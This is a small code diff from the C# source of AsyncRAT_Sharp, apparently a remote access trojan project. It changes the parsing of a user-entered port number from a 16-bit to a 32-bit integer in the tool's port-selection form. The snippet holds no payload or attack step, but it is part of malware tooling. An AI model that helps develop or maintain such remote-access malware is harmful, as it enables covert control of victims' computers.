@@ -232,7 +232,7 @@ namespace AsyncRAT_Sharp.Forms
         {
             try
             {
-                Convert.ToInt16(textPort.Text.Trim());
+                Convert.ToInt32(textPort.Text.Trim());
                 foreach (string item in listBoxPort.Items)
                 {
                     if (item.Equals(textPort.Text.Trim()))
